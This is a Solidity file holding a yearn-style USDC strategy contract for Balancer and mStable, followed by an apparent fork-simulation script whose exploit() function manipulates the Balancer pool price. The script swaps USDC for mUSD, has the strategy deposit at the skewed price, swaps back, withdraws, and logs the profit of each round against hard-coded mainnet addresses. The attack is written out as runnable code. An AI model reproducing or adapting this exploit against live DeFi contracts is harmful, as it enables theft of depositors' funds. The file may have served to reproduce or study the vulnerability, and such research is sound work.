pragma solidity ^0.5.0;

// SPDX-License-Identifier: MIT


library fmt {
    function printf(string memory format, bytes memory args) public;

    function print(string memory message) public;

    function println(string memory message) public;
}

pragma solidity ^0.5.16;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
    function toPayable(address account) internal pure returns (address payable) {
        return address(uint160(account));
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-call-value
        (bool success, ) = recipient.call.value(amount)("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

library SafeERC20 {
    using SafeMath for uint256;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}


interface Controller {
    function vaults(address) external view returns (address);
}

interface Balancer {
    function joinPool(uint,uint[] calldata) external;
    function exitPool(uint,uint[] calldata) external;
}

interface MStable {
    function mint(address, uint) external;
    function redeem(address, uint) external;
}

/*

 A strategy must implement the following calls;

 - deposit()
 - withdraw(address) must exclude any tokens used in the yield - Controller role - withdraw should return to Controller
 - withdraw(uint) - Controller | Vault role - withdraw should always return to vault
 - withdrawAll() - Controller | Vault role - withdraw should always return to vault
 - balanceOf()

 Where possible, strategies must remain as immutable as possible, instead of updating variables, we update the contract by linking it in the controller

*/

/*

 Strategy ~ 50% USDC to mUSD
 mUSD+USDC into balancer
 BAL+MTA

*/

contract StrategyBalancerMTA {
    using SafeERC20 for IERC20;
    using Address for address;
    using SafeMath for uint256;

    address constant public want = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address constant public mUSD = address(0xe2f2a5C287993345a840Db3B0845fbC70f5935a5);
    address constant public balancer = address(0x72Cd8f4504941Bf8c5a21d1Fd83A96499FD71d2C);


    address public governance;
    address public controller;
    bool public breaker = false;
    // Supply tracks the number of `want` that we have lent out of other distro's
    uint public supply = 0;

    constructor(address _controller) public {
        governance = msg.sender;
        controller = _controller;
    }

    function setBreaker(bool _breaker) public {
        require(msg.sender == governance, "!governance");
        breaker = _breaker;
    }

    function deposit() external {
        require(breaker == false, "!breaker");
        uint _balance = IERC20(want).balanceOf(address(this));
        uint _want = _balance.div(2);
        IERC20(want).safeApprove(mUSD, 0);
        IERC20(want).safeApprove(mUSD, _want);

        uint _before = _balance;
        MStable(mUSD).mint(want, _want);
        uint _after = IERC20(want).balanceOf(address(this));
        supply = supply.add(_before.sub(_after));

        uint _musd = IERC20(mUSD).balanceOf(address(this));

        uint _total = IERC20(balancer).totalSupply();
        uint _balancerMUSD = IERC20(mUSD).balanceOf(balancer);
        uint _poolAmountMUSD = _musd.mul(_total).div(_balancerMUSD);

        uint _balancerUSDC = IERC20(want).balanceOf(balancer);
        uint _poolAmountUSDC = _want.mul(_total).div(_balancerUSDC);

        uint _poolAmountOut = _poolAmountMUSD;
        if (_poolAmountUSDC < _poolAmountOut) {
            _poolAmountOut = _poolAmountUSDC;
        }

        IERC20(want).safeApprove(balancer, 0);
        IERC20(want).safeApprove(balancer, _want);
        IERC20(mUSD).safeApprove(balancer, 0);
        IERC20(mUSD).safeApprove(balancer, _musd);

        uint[] memory _maxAmountIn = new uint[](2);
        _maxAmountIn[0] = _musd;
        _maxAmountIn[1] = _want;
        _before = IERC20(want).balanceOf(address(this));
        Balancer(balancer).joinPool(_poolAmountOut, _maxAmountIn);
        _after = IERC20(want).balanceOf(address(this));
        supply = supply.add(_before.sub(_after));
    }

    // Controller only function for creating additional rewards from dust
    function withdraw(IERC20 _asset) external returns (uint balance) {
        require(msg.sender == controller, "!controller");
        require(address(_asset) != want, "!c");
        require(address(_asset) != mUSD, "!c");
        require(address(_asset) != balancer, "!c");
        balance = _asset.balanceOf(address(this));
        _asset.safeTransfer(controller, balance);
    }

    function withdrawM(uint _amount) internal returns (uint) {
        if (_amount > supply) {
            // Pool made too much profit, so we reset to 0 to avoid revert
            supply = 0;
        } else {
            supply = supply.sub(_amount);
        }

        uint _before = IERC20(want).balanceOf(address(this));
        MStable(mUSD).redeem(want, _amount);
        uint _after  = IERC20(want).balanceOf(address(this));
        return _after.sub(_before);
    }

    function withdrawBPT(uint _amount) internal returns (uint) {
        uint _calc = IERC20(balancer).balanceOf(address(this)).mul(_amount).div(balanceOf());//calculateRatio(_amount);
        _amount = _amount.sub(_amount.mul(5).div(10000));
        return _withdrawSome(_calc, _amount);
    }

    function calculateRatio(uint _amount) public view returns (uint) {
        uint _musd = normalize(IERC20(mUSD).balanceOf(balancer));
        uint _want = IERC20(want).balanceOf(balancer);
        uint _total = _musd.add(_want);
        uint _ratio = _amount.mul(_want).div(_total);
        return _ratio;
    }

    // Withdraw partial funds, normally used with a vault withdrawal
    function withdraw(uint _amount) external {
        require(msg.sender == controller, "!controller");
        uint _balance = IERC20(want).balanceOf(address(this));
        if (_balance < _amount) {
            uint _musd = normalize(IERC20(mUSD).balanceOf(address(this)));
            uint _remainder = _amount.sub(_balance);
            if (_musd > 0) {
                if (_musd > _remainder) {
                    _amount = withdrawM(_remainder);
                    _amount = _amount.add(_balance);
                } else {
                    _remainder = _remainder.sub(_musd);
                    uint _withdrew = withdrawM(_musd);
                    _amount = _withdrew.add(_balance);
                    _withdrew = withdrawBPT(_remainder);
                    _amount = _amount.add(_withdrew);
                }
            } else {
                _amount = withdrawBPT(_remainder);
                _amount = _amount.add(_balance);
            }

        }
        /*
        address _vault = Controller(controller).vaults(want);
        require(_vault != address(0), "!vault"); // additional protection so we don't burn the funds
        IERC20(want).safeTransfer(_vault, _amount);
        */
        IERC20(want).safeTransfer(msg.sender, _amount);
    }

    function redeem() external {
        require(msg.sender == governance, "!governance");
        uint _balance = normalize(IERC20(mUSD).balanceOf(address(this)));
        if (_balance > supply) {
            // Pool made too much profit, so we reset to 0 to avoid revert
            supply = 0;
        } else {
            supply = supply.sub(_balance);
        }

        MStable(mUSD).redeem(want, _balance);
    }

    // Withdraw all funds, normally used when migrating strategies
    function withdrawAll() external returns (uint balance) {
        require(msg.sender == controller, "!controller");
        _withdrawAll();
        balance = IERC20(want).balanceOf(address(this));
        /*
        address _vault = Controller(controller).vaults(want);
        require(_vault != address(0), "!vault"); // additional protection so we don't burn the funds
        IERC20(want).safeTransfer(_vault, balance);
        */
        IERC20(want).safeTransfer(msg.sender, balance);
    }

    function _withdrawAll() internal {
        uint _bpt = IERC20(balancer).balanceOf(address(this));
        uint[] memory _minAmountOut = new uint[](2);
        _minAmountOut[0] = 0;
        _minAmountOut[1] = 0;
        uint _before = IERC20(want).balanceOf(address(this));
        Balancer(balancer).exitPool(_bpt, _minAmountOut);
        uint _after = IERC20(want).balanceOf(address(this));
        uint _diff = _after.sub(_before);
        if (_diff > supply) {
            // Pool made too much profit, so we reset to 0 to avoid revert
            supply = 0;
        } else {
            supply = supply.sub(_after.sub(_before));
        }
        uint _musd = IERC20(mUSD).balanceOf(address(this));

        // This one is the exception because it assumes we can redeem 1 USDC
        _diff = normalize(_musd);
        if (_diff > supply) {
            // Pool made too much profit, so we reset to 0 to avoid revert
            supply = 0;
        } else {
            supply = supply.sub(_diff);
        }
        MStable(mUSD).redeem(want, _diff);
    }

    function _withdrawSome(uint256 _bpt, uint _max) internal returns (uint) {
        uint[] memory _minAmountOut = new uint[](2);
        _minAmountOut[0] = 0;
        _minAmountOut[1] = 0;

        uint _before = IERC20(want).balanceOf(address(this));
        uint _mBefore = IERC20(mUSD).balanceOf(address(this));
        Balancer(balancer).exitPool(_bpt, _minAmountOut);
        uint _mAfter = IERC20(mUSD).balanceOf(address(this));
        uint _after = IERC20(want).balanceOf(address(this));

        uint _musd = _mAfter.sub(_mBefore);
        uint _withdrew = _after.sub(_before);

        if (_withdrew > supply) {
            // Pool made too much profit, so we reset to 0 to avoid revert
            supply = 0;
        } else {
            supply = supply.sub(_withdrew);
        }
        _musd = normalize(_musd);
        if (_musd > supply) {
            // Pool made too much profit, so we reset to 0 to avoid revert
            supply = 0;
        } else {
            supply = supply.sub(_musd);
        }
        _before = IERC20(want).balanceOf(address(this));
        MStable(mUSD).redeem(want, _musd);
        _after = IERC20(want).balanceOf(address(this));
        _withdrew = _withdrew.add(_after.sub(_before));
        // Apply the fee as a difference
        //_withdrew = _withdrew.sub(_musd.sub(_after.sub(_before)));
        if (_withdrew > _max) {
            _withdrew = _max;
        }
        return _withdrew;
    }

    function normalize(uint _amount) public view returns (uint) {
        return _amount.mul(10**IERC20(want).decimals()).div(10**IERC20(mUSD).decimals());
    }

    function balanceOf() public view returns (uint) {
        return IERC20(want).balanceOf(address(this))
                .add(supply);
    }


    function setGovernance(address _governance) external {
        require(msg.sender == governance, "!governance");
        governance = _governance;
    }

    function setController(address _controller) external {
        require(msg.sender == governance, "!governance");
        controller = _controller;
    }
}

contract ERC20Like {
    function decimals() public returns (uint8);
    function name() public returns (string memory);
    function symbol() public returns (string memory);
    function approve(address,uint) public;

    function approveAndCall(address, uint, bytes memory) public;

    function balanceOf(address) public view returns (uint);
    function transfer(address, uint) public;
    function transferFrom(address, address, uint) public;
    function totalSupply() public returns (uint);

    function mint(address, uint) public;
}

library impl {
    function setScriptName(string memory name) public;

    function setBlockNumber(uint number) public;

    function addWatchedBalance(ERC20Like addr) public;

    function advanceBlocks(uint number) public;

    function advanceTime(uint secs) public;
}

library sys {
    function setName(string memory name) public;
}

library step {
    function run(string memory name, address who, bytes4 sel) public returns (uint);

    function withCaller(uint, address caller) public returns (uint);

    function withBalance(uint, uint balance) public returns (uint);
}

contract script {
    using step for uint;

    function name(string memory n) internal {
        impl.setScriptName(n);
    }

    function blockNumber(uint blockNr) internal {
        impl.setBlockNumber(blockNr);
    }

    function watchBalance(ERC20Like addr) internal {
        impl.addWatchedBalance(addr);
    }

    function advanceBlocks(uint blocks) internal {
        impl.advanceBlocks(blocks);
    }

    function advanceTime(uint secs) internal {
        impl.advanceTime(secs);
    }

    function run(function() external func) internal returns (uint) {
        return run("", func);
    }

    function run(string memory desc, function() external func) internal returns (uint) {
        return step.run(desc, address(func), func.selector);
    }

    // @notice configure script parameters
    function setup() public {}

    // @notice the entry point, to be implemented by you
    function run() public;

    function() external payable {}
}


contract yVaultLike is ERC20Like {
    function earn() public;
    function deposit(uint) public;
    function withdraw(uint) public;
    function getPricePerFullShare() public returns (uint);
    function balance() external returns (uint);
}

contract BPoolLike is ERC20Like {
    function joinPool(uint poolAmountOut, uint[] calldata maxAmountsIn) external;
    function exitPool(uint poolAmountIn, uint[] calldata minAmountsOut) external;
    function swapExactAmountIn(
        address tokenIn,
        uint tokenAmountIn,
        address tokenOut,
        uint minAmountOut,
        uint maxPrice
    ) external returns (uint tokenAmountOut, uint spotPriceAfter);
    function swapExactAmountOut(
        address tokenIn,
        uint maxAmountIn,
        address tokenOut,
        uint tokenAmountOut,
        uint maxPrice
    ) external returns (uint tokenAmountIn, uint spotPriceAfter);
    function joinswapExternAmountIn(address tokenIn, uint tokenAmountIn, uint minPoolAmountOut) external returns (uint poolAmountOut);
    function exitswapPoolAmountIn(address tokenOut, uint poolAmountIn, uint minAmountOut) external returns (uint tokenAmountOut);
}

contract StrategyLike {
    function setBreaker(bool) external;
    function deposit() external;
    function balanceOf() external returns (uint);
    function redeem() external;
    function withdrawAll() external;
    function withdrawAllExploit() external;
    function withdraw(uint) external;
}

contract MStableLike {
    function mint(address,uint) external;
    function redeem(address,uint) external;
}

contract ControllerLike {
    function setStrategy(ERC20Like, StrategyLike) external;
}

contract YVault1 is script {
    using SafeMath for uint;
    function setup() public {}

    function run() public {
        run(this.enable)
            .withCaller(0x2D407dDb06311396fE14D4b49da5F0471447d45C);

        run(this.exploit)
            .withCaller(0xBE0eB53F46cd790Cd13851d5EFf43D12404d33E8);
    }

    ERC20Like internal constant USDC = ERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    yVaultLike private constant YUSDC = yVaultLike(0x597aD1e0c13Bfe8025993D9e79C69E1c0233522e);
    BPoolLike private constant POOL = BPoolLike(0x72Cd8f4504941Bf8c5a21d1Fd83A96499FD71d2C);
    ERC20Like private constant MUSD = ERC20Like(0xe2f2a5C287993345a840Db3B0845fbC70f5935a5);
    MStableLike private constant MSTABLE = MStableLike(0xe2f2a5C287993345a840Db3B0845fbC70f5935a5);
    StrategyLike private STRATEGY = StrategyLike(0x15F8aFe8e14A91814808fb14Cdf25FeCa4bD835a);
    ControllerLike private constant CONTROLLER = ControllerLike(0x31317F9A5E4cC1d231bdf07755C994015A96A37c);

    function enable() external {
        address _strat = address(new StrategyBalancerMTA(0xBE0eB53F46cd790Cd13851d5EFf43D12404d33E8));
        STRATEGY = StrategyLike(_strat);
        //USDC.transfer(address(0xfd96B0d3a268e986806aa465f6185Dc6dC8d6Dd0), USDC.balanceOf(address(this)));
        //StrategyLike(0xfd96B0d3a268e986806aa465f6185Dc6dC8d6Dd0).setBreaker(false);
        //StrategyLike(0xfd96B0d3a268e986806aa465f6185Dc6dC8d6Dd0).deposit();
        //CONTROLLER.setStrategy(USDC, STRATEGY);
        // YUSDC.setMin(10000);
    }

    function exploit() external {
        USDC.transfer(address(STRATEGY), 10000000e6);
        STRATEGY.deposit();


        uint realStart = USDC.balanceOf(address(this));
        USDC.approve(address(YUSDC), uint(-1));
        USDC.approve(address(POOL), uint(-1));
        USDC.approve(address(MUSD), uint(-1));
        MUSD.approve(address(POOL), uint(-1));

        //YUSDC.earn();

        for (uint i = 0; i < 10; i++) {
            uint start = USDC.balanceOf(address(this));





            (uint poolOut,) = POOL.swapExactAmountIn(
                address(USDC),
                5000000e6,
                address(MUSD),
                uint(0),
                uint(-1)
            );
            fmt.printf("poolOut musd=%.18u\n", abi.encode(poolOut));
            /*(uint poolOut2,) = POOL.swapExactAmountIn(
                address(USDC),
                5000000e6,
                address(MUSD),
                uint(0),
                uint(-1)
            );*/

            uint _bpt = POOL.balanceOf(address(STRATEGY));
            USDC.transfer(address(STRATEGY), 3000000e6);
            STRATEGY.deposit();
            _bpt = POOL.balanceOf(address(STRATEGY)).sub(_bpt);
            fmt.printf("added bpt=%.18u\n", abi.encode(_bpt));
            //YUSDC.deposit(3000000e6);
            //YUSDC.earn();

            (poolOut,) = POOL.swapExactAmountIn(
                address(MUSD),
                MUSD.balanceOf(address(this)),
                address(USDC),
                uint(0),
                uint(-1)
            );
            fmt.printf("poolOut usdc=%.6u\n", abi.encode(poolOut));
            /*(poolOut,) = POOL.swapExactAmountIn(
                address(MUSD),
                MUSD.balanceOf(address(this)),
                address(USDC),
                uint(0),
                uint(-1)
            );*/

            uint _before = USDC.balanceOf(address(this));
            _bpt = POOL.balanceOf(address(STRATEGY));
            STRATEGY.withdraw(3000000e6);
            _bpt = _bpt.sub(POOL.balanceOf(address(STRATEGY)));
            fmt.printf("removed bpt=%.18u\n", abi.encode(_bpt));
            uint _after = USDC.balanceOf(address(this));
            fmt.printf("withdrew usdc=%.6u\n", abi.encode(_after.sub(_before)));


            //MSTABLE.redeem(address(USDC), MUSD.balanceOf(address(this)).mul(1e6).div(1e18));
            uint end = USDC.balanceOf(address(this));



            if (end < start) {
                fmt.printf("start=%.6u end=%.6u\n", abi.encode(start, end));
                // did not make a profit, abort
                break;
            }

            fmt.printf("ending usdc=%.6u profit=%.6u\n", abi.encode(end, end - start));
        }

        uint realEnd = USDC.balanceOf(address(this));

        fmt.printf("total profit=%.6u\n", abi.encode(realEnd - realStart));
    }
}
